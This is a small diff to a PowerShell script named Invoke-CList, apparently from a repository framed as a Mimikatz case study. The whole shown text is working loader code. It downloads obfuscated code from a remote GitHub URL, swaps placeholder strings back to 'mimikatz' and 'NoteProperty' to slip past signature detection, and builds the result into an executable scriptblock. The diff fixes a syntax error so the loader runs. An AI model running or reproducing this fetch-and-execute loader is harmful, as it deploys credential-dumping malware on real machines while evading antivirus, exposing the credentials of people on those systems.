@@ -4,7 +4,7 @@
 # Invoke-CList
 
 $strSourceUrl = "https://raw.githubusercontent.com/abanakiya/CaseStudy_Invoke-Mimikatz/master/clist/clist.txt"
-$strCode = Invoke-RestMethod -Method Get-Uri $strSourceUrl
+$strCode = Invoke-RestMethod -Method Get -Uri $strSourceUrl
 $strCode = $strCode -replace "Nooote", "NoteProperty"
 $strCode = $strCode -replace "meemeemeow", "mimikatz"
 $strCode = [scriptblock]::Create($strCode)
